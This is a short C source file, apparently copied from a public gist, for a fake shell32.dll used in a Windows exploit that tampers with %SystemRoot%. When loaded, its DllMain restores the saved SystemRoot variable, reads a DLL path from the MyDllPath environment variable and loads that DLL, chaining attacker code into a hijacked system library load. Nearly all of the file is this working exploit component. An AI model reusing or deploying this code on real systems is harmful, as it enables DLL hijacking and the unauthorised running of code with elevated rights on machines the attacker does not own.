/*
From: https://gist.github.com/worawit/1213febe36aa8331e092

Fake shell32.dll to be loaded after modified %SystemRoot%
*/
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

static void do_work()
{
	WCHAR envBuffer[256];

	GetEnvironmentVariableW(L"SaveSystemRoot", envBuffer, sizeof(envBuffer));
	// restore system root
	SetEnvironmentVariableW(L"SystemRoot", envBuffer);
	//SetEnvironmentVariableW(L"SaveSystemRoot", NULL);

	GetEnvironmentVariableW(L"MyDllPath", envBuffer, sizeof(envBuffer));
	SetEnvironmentVariableW(L"MyDllPath", NULL);

	// shell32.dll will be unloaded, use another dll
	LoadLibraryExW(envBuffer, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		do_work();
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
